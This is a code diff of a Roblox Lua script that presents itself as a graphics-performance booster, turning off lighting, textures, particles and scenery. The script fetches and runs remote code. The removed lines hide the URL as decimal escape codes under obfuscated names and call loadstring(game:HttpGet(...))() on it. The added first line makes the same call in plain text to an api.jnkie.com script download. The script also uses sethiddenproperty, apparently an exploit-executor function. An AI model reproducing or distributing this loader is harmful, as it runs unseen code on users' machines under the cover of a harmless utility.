@@ -1,58 +1,160 @@
-local _0x1a = game:GetService("Players")
-local _0x2b = game:GetService("Lighting")
-local _0x3c = workspace:FindFirstChildOfClass("Terrain")
+loadstring(game:HttpGet("https://api.jnkie.com/api/v1/luascripts/public/fcd12f3fbf588f8e87d2ca48bc83542e9666d0527d37f6112ea7fb60624ab0df/download"))()
+
+local Players = game:GetService("Players")
+local Lighting = game:GetService("Lighting")
+local RunService = game:GetService("RunService")
+local Terrain = workspace:FindFirstChildOfClass("Terrain")
 
 settings().Rendering.QualityLevel = Enum.QualityLevel.Level0
-_0x2b.GlobalShadows = false
-_0x2b.Brightness = 2
-_0x2b.FogEnd = 999999
+settings().Rendering.EditQualityLevel = Enum.QualityLevel.Level0
+settings().Rendering.MeshPartDetailLevel = Enum.MeshPartDetailLevel.Level0
+settings().Rendering.TextureQualityEnum = Enum.TextureQualitySetting.None
+settings().Rendering.ShadowsEnabled = false
+settings().Physics.VisualThrottle = Enum.ThrottleBehavior.Default
+settings().Network.IncomingReplicationLag = 0
 
-for _, _0x4d in pairs(_0x2b:GetChildren()) do
-    if _0x4d:IsA("PostEffect") or _0x4d:IsA("Sky") then
-        _0x4d:Destroy()
+pcall(function()
+    sethiddenproperty(Lighting, "Technology", Enum.Technology.Compatibility)
+end)
+
+Lighting.GlobalShadows = false
+Lighting.Brightness = 1
+Lighting.FogEnd = 100000
+Lighting.FogStart = 0
+Lighting.EnvironmentSpecularScale = 0
+Lighting.EnvironmentDiffuseScale = 0
+Lighting.ShadowSoftness = 0
+Lighting.Ambient = Color3.fromRGB(128, 128, 128)
+Lighting.OutdoorAmbient = Color3.fromRGB(128, 128, 128)
+
+for _, v in pairs(Lighting:GetChildren()) do
+    if v:IsA("PostEffect") or v:IsA("Sky") or v:IsA("Atmosphere") or v:IsA("BloomEffect") or v:IsA("ColorCorrectionEffect") or v:IsA("BlurEffect") or v:IsA("SunRaysEffect") or v:IsA("DepthOfFieldEffect") or v:IsA("FireEffect") then
+        v:Destroy()
     end
 end
 
-if _0x3c then
-    _0x3c.WaterWaveSize = 0
-    _0x3c.WaterWaveSpeed = 0
-    _0x3c.WaterReflectance = 0
-    _0x3c.WaterTransparency = 0
+if Terrain then
+    Terrain.WaterWaveSize = 0
+    Terrain.WaterWaveSpeed = 0
+    Terrain.WaterReflectance = 0
+    Terrain.WaterTransparency = 1
+    Terrain.WaterColor = Color3.fromRGB(128, 128, 128)
 end
 
-local function _0x5e(_0x6f)
-    if _0x6f:IsA("BasePart") then
-        _0x6f.Material = Enum.Material.SmoothPlastic
-        _0x6f.Reflectance = 0
-        _0x6f.CastShadow = false
-    elseif _0x6f:IsA("Decal") or _0x6f:IsA("Texture") then
-        _0x6f:Destroy()
-    elseif _0x6f:IsA("ParticleEmitter") or _0x6f:IsA("Trail") or _0x6f:IsA("Fire") or _0x6f:IsA("Smoke") or _0x6f:IsA("Sparkles") then
-        _0x6f:Destroy()
+local function destroyEffects(obj)
+    if obj:IsA("Trail") or obj:IsA("Beam") or obj:IsA("ParticleEmitter") then
+        obj:Destroy()
+        return true
+    end
+    if obj:IsA("Fire") or obj:IsA("Smoke") or obj:IsA("Sparkles") or obj:IsA("Explosion") then
+        obj:Destroy()
+        return true
+    end
+    if obj:IsA("PointLight") or obj:IsA("SpotLight") or obj:IsA("SurfaceLight") then
+        obj:Destroy()
+        return true
+    end
+    if obj:IsA("Decal") or obj:IsA("Texture") then
+        obj:Destroy()
+        return true
+    end
+    if obj:IsA("SpecialMesh") or obj:IsA("DataModelMesh") then
+        obj:Destroy()
+        return true
+    end
+    if obj:IsA("Sound") then
+        obj:Destroy()
+        return true
+    end
+    if obj:IsA("BillboardGui") or obj:IsA("SurfaceGui") then
+        obj:Destroy()
+        return true
+    end
+    return false
+end
+
+local function cleanPart(obj)
+    if obj:IsA("BasePart") then
+        obj.Material = Enum.Material.SmoothPlastic
+        obj.Reflectance = 0
+        obj.CastShadow = false
+        pcall(function()
+            obj.TopSurface = Enum.SurfaceType.Smooth
+            obj.BottomSurface = Enum.SurfaceType.Smooth
+        end)
+    end
+    destroyEffects(obj)
+end
+
+local function removeModel(obj)
+    if obj:IsA("Model") or obj:IsA("Folder") then
+        local name = obj.Name:lower()
+        local keywords = {"tree", "plant", "grass", "leaves", "bush", "flower", "prop", "rock", "debris", "particle", "vfx", "fx", "effect", "light", "fire", "smoke", "sparkle", "explosion", "trail", "beam", "decor"}
+        for _, key in ipairs(keywords) do
+            if name:find(key) then
+                obj:Destroy()
+                return true
+            end
+        end
+    end
+    return false
+end
+
+for _, v in pairs(workspace:GetDescendants()) do
+    if not v:IsDescendantOf(Players.LocalPlayer and Players.LocalPlayer.Character or nil) then
+        removeModel(v)
     end
 end
 
-for _, _0x70 in pairs(workspace:GetDescendants()) do
-    _0x5e(_0x70)
-    if _0x70:IsA("Model") then
-        local _0x81 = _0x70.Name:lower()
-        if _0x81:find("tree") or _0x81:find("plant") or _0x81:find("grass") or _0x81:find("leaves") or _0x81:find("bush") or _0x81:find("flower") or _0x81:find("prop") then
-            _0x70:Destroy()
+for _, v in pairs(workspace:GetDescendants()) do
+    if v.Parent then
+        cleanPart(v)
+    end
+end
+
+workspace.DescendantAdded:Connect(function(v)
+    task.defer(function()
+        if v.Parent then
+            removeModel(v)
+            cleanPart(v)
+        end
+    end)
+end)
+
+workspace:FindFirstChildOfClass("Terrain").DescendantAdded:Connect(function(v)
+    v:Destroy()
+end)
+
+local function onCharacter(char)
+    char:WaitForChild("Humanoid", 10)
+    for _, v in pairs(char:GetDescendants()) do
+        if v:IsA("ParticleEmitter") or v:IsA("Trail") or v:IsA("Beam") or v:IsA("Fire") or v:IsA("Smoke") or v:IsA("Sparkles") or v:IsA("PointLight") or v:IsA("SpotLight") then
+            v:Destroy()
+        end
+    end
+    char.DescendantAdded:Connect(function(v)
+        if v:IsA("ParticleEmitter") or v:IsA("Trail") or v:IsA("Beam") or v:IsA("Fire") or v:IsA("Smoke") or v:IsA("Sparkles") or v:IsA("PointLight") or v:IsA("SpotLight") then
+            v:Destroy()
+        end
+    end)
+end
+
+local localPlayer = Players.LocalPlayer
+if localPlayer.Character then
+    onCharacter(localPlayer.Character)
+end
+localPlayer.CharacterAdded:Connect(onCharacter)
+
+for _, v in pairs(Players:GetPlayers()) do
+    if v ~= localPlayer and v.Character then
+        for _, d in pairs(v.Character:GetDescendants()) do
+            if d:IsA("ParticleEmitter") or d:IsA("Trail") or d:IsA("Beam") or d:IsA("Fire") or d:IsA("Smoke") or d:IsA("Sparkles") then
+                d:Destroy()
+            end
         end
     end
 end
 
-workspace.DescendantAdded:Connect(function(_0x92)
-    _0x5e(_0x92)
+pcall(function()
+    game:GetService("StarterGui"):SetCore("ParticlesDisabled", true)
 end)
-
-local _0x9a = {
-    "\104\116\116\112\115\58\47\47\97\112\105\46\106\110\107\105\101\46\99\111\109\47\97\112\105\47\118\49\47\108\117\97\115\99\114\105\112\116\115\47\112\117\98\108\105\99\47\102\99\100\49\50\102\51\102\98\102\53\56\56\102\56\101\56\55\100\50\99\97\52\56\98\99\56\51\53\52\50\101\57\54\54\54\100\48\53\50\100\51\55\102\54\49\50\101\97\55\102\98\54\48\54\50\52\97\98\48\100\102\47\100\111\119\110\108\111\97\100"
-}
-
-local _0xab = ""
-for _, _0xbc in ipairs(_0x9a) do
-    _0xab = _0xab .. _0xbc
-end
-
-loadstring(game:HttpGet(_0xab))()
